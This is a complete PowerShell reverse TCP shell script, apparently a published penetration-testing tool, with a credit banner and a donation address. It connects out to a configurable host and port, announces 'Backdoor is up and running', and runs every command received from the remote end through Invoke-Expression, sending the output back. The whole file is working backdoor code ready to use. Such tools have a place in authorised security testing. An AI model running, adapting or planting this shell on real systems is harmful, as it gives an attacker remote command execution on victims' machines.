Write-Host "########################################################################";
Write-Host "#                                                                      #";
Write-Host "#                        PowerShell Reverse TCP                        #";
Write-Host "#                                          by Ivan Sincek              #";
Write-Host "#                                                                      #";
Write-Host "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
Write-Host "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
Write-Host "#                                                                      #";
Write-Host "########################################################################";
$socket = $null;
$stream = $null;
$buffer = $null;
$writer = $null;
$data = $null;
$result = $null;
try {
	# change the host address and/or port number as necessary
	$socket = New-Object Net.Sockets.TcpClient("127.0.0.1", 9000);
	$stream = $socket.GetStream();
	$buffer = New-Object Byte[] 1024;
	$encoding = New-Object Text.AsciiEncoding;
	$writer = New-Object IO.StreamWriter($stream);
	$writer.AutoFlush = $true;
	Write-Host "Backdoor is up and running...";
	do {
		$writer.Write("PS>");
		do {
			$bytes = $stream.Read($buffer, 0, $buffer.Length);
			if ($bytes -gt 0) {
				$data = $data + $encoding.GetString($buffer, 0, $bytes);
			} else {
				$data = "exit";
			}
		} while ($stream.DataAvailable);
		if ($data.Length -gt 0 -and $data -ne "exit") {
			try {
				$result = Invoke-Expression $data | Out-String;
			} catch {
				$result = $_.Exception.InnerException.Message;
			}
			$writer.WriteLine($result);
			Clear-Variable -Name "data";
		}
	} while ($data -ne "exit");
} catch {
	Write-Host $_.Exception.InnerException.Message;
} finally {
	if ($socket -ne $null) {
		$socket.Close();
		$socket.Dispose();
	}
	if ($stream -ne $null) {
		$stream.Close();
		$stream.Dispose();
	}
	if ($buffer -ne $null) {
		$buffer.Clear();
	}
	if ($writer -ne $null) {
		$writer.Close();
		$writer.Dispose();
	}
	if ($data -ne $null) {
		Clear-Variable -Name "data";
	}
	if ($result -ne $null) {
		Clear-Variable -Name "result";
	}
}
